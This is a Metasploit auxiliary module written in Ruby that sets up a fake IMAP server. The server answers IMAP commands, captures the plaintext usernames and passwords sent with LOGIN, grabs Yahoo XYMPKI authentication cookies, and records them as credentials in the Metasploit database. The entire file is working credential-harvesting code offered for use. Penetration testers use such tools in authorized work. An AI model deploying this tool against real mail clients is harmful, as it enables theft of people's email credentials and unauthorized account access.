##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::TcpServer
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'        => 'Authentication Capture: IMAP',
      'Description'    => %q{
        This module provides a fake IMAP service that
      is designed to capture authentication credentials.
      },
      'Author'      => ['ddz', 'hdm'],
      'License'     => MSF_LICENSE,
      'Actions'     =>
        [
          [ 'Capture' ]
        ],
      'PassiveActions' =>
        [
          'Capture'
        ],
      'DefaultAction'  => 'Capture'
    )

    register_options(
      [
        OptPort.new('SRVPORT',  [ true, "The local port to listen on.", 143 ]),
        OptString.new('BANNER', [ true, "The server banner",  'IMAP4'])
      ])
  end

  def setup
    super
    @state = {}
  end

  def run
    exploit()
  end

  def on_client_connect(c)
    @state[c] = {:name => "#{c.peerhost}:#{c.peerport}", :ip => c.peerhost, :port => c.peerport, :user => nil, :pass => nil}
    c.put "* OK #{datastore['BANNER']}\r\n"
  end

  def on_client_data(c)
    data = c.get_once
    return unless data
    num, cmd, arg = data.strip.split(/\s+/, 3)
    arg ||= ""

    if cmd.upcase == 'CAPABILITY'
      c.put "* CAPABILITY IMAP4 IMAP4rev1 IDLE LOGIN-REFERRALS " +
        "MAILBOX-REFERRALS NAMESPACE LITERAL+ UIDPLUS CHILDREN UNSELECT " +
        "QUOTA XLIST XYZZY LOGIN-REFERRALS AUTH=XYMCOOKIE AUTH=XYMCOOKIEB64 " +
        "AUTH=XYMPKI AUTH=XYMECOOKIE ID\r\n"
      c.put "#{num} OK CAPABILITY completed.\r\n"
    end

    # Handle attempt to authenticate using Yahoo's magic cookie
    # Used by iPhones and Zimbra
    if cmd.upcase == 'AUTHENTICATE' && arg.upcase == 'XYMPKI'
      c.put "+ \r\n"
      cookie1 = c.get_once
      c.put "+ \r\n"
      cookie2 = c.get_once
      register_creds(@state[c][:ip], cookie1, cookie2, 'imap-yahoo')
      return
    end

    if cmd.upcase == 'LOGIN'
      @state[c][:user], @state[c][:pass] = arg.split(/\s+/, 2)

      register_creds(@state[c][:ip], @state[c][:user], @state[c][:pass], 'imap')
      print_good("IMAP LOGIN #{@state[c][:name]} #{@state[c][:user]} / #{@state[c][:pass]}")
      return
    end

    if cmd.upcase == 'LOGOUT'
      c.put("* BYE IMAP4rev1 Server logging out\r\n")
      c.put("#{num} OK LOGOUT completed\r\n")
      return
    end

    @state[c][:pass] = data.strip
    c.put "#{num} NO LOGIN FAILURE\r\n"
    return
  end

  def on_client_close(c)
    @state.delete(c)
  end

  def register_creds(client_ip, user, pass, service_name)
    # Build service information
    service_data = {
      address: client_ip,
      port: datastore['SRVPORT'],
      service_name: service_name,
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    # Build credential information
    credential_data = {
      origin_type: :service,
      module_fullname: self.fullname,
      private_data: pass,
      private_type: :password,
      username: user,
      workspace_id: myworkspace_id
    }

    credential_data.merge!(service_data)
    credential_core = create_credential(credential_data)

    # Assemble the options hash for creating the Metasploit::Credential::Login object
    login_data = {
      core: credential_core,
      status: Metasploit::Model::Login::Status::UNTRIED,
      workspace_id: myworkspace_id
    }

    login_data.merge!(service_data)
    create_credential_login(login_data)
  end
end
